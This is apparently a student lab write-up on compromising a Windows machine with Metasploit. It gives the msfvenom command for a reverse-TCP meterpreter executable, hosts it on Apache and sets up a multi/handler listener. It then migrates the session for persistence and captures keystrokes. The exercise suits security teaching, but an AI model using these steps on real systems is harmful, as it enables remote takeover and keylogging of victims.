# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:


<img width="627" height="311" alt="Screenshot 2026-02-06 204732" src="https://github.com/user-attachments/assets/5c4f35d1-e4d7-45c1-8fe4-67782fa108a9" />



Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:


<img width="726" height="136" alt="Screenshot 2026-02-06 205002" src="https://github.com/user-attachments/assets/6a5cb2eb-8972-4fdb-9e8a-1c53b8fef905" />




copy the fun.exe into the apache /var/www/html folder
## OUTPUT:


<img width="412" height="56" alt="Screenshot 2026-02-06 205041" src="https://github.com/user-attachments/assets/c90f0a6d-d694-4dd1-884f-448d60a31e8f" />



Start apache server
sudo systemctl apache2 start
## OUTPUT:


<img width="359" height="42" alt="Screenshot 2026-02-06 205129" src="https://github.com/user-attachments/assets/e301e070-48e4-4ef6-922a-9b15785a15f5" />



Check the status of apache2
## OUTPUT:



![image](https://github.com/user-attachments/assets/1577dcc8-8e32-4080-8459-521367056dc0)




Invoke msfconsole:
## OUTPUT:


<img width="785" height="479" alt="Screenshot 2026-02-06 205312" src="https://github.com/user-attachments/assets/ab170172-273b-4b92-b6f0-1884b7b5d0a6" />





Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:



<img width="769" height="603" alt="Screenshot 2026-02-06 205400" src="https://github.com/user-attachments/assets/9231108b-665c-496b-90d5-f4fec5c2e90d" />





Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:



<img width="676" height="195" alt="Screenshot 2026-02-06 210051" src="https://github.com/user-attachments/assets/ccaa54cc-ef41-4ee3-9eb2-55ed4d330e03" />




On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:


<img width="911" height="755" alt="Screenshot 2026-02-11 091437" src="https://github.com/user-attachments/assets/56f4bfd3-b344-46d7-b52d-d64999016b28" />




Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:



<img width="1147" height="947" alt="Screenshot 2026-02-11 094021" src="https://github.com/user-attachments/assets/700e2f07-5043-44e0-bd78-e2aa7f2134eb" />





On kali/parrot give the command exploit
## OUTPUT:



<img width="401" height="47" alt="Screenshot 2026-02-11 094816" src="https://github.com/user-attachments/assets/c64ed94f-0fb1-4ec5-a26b-17c46cb31019" />




To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:


<img width="336" height="120" alt="image" src="https://github.com/user-attachments/assets/a9023eb6-7a08-4310-9a98-cc1f65c4e706" />





The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe

at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 
## OUTPUT:


<img width="618" height="370" alt="image" src="https://github.com/user-attachments/assets/577cc3a3-ba98-4d4c-8d3a-0a504115bbdb" />



Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.
## OUTPUT:


<img width="479" height="66" alt="image" src="https://github.com/user-attachments/assets/28807bd2-546a-4886-bf66-2ec88b6b030c" />



keyscan_dump	Shows the keystrokes captured so far
## OUTPUT:



<img width="595" height="236" alt="image" src="https://github.com/user-attachments/assets/a381ab78-4a7f-4efc-b88c-dd6a4d026e69" />





## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


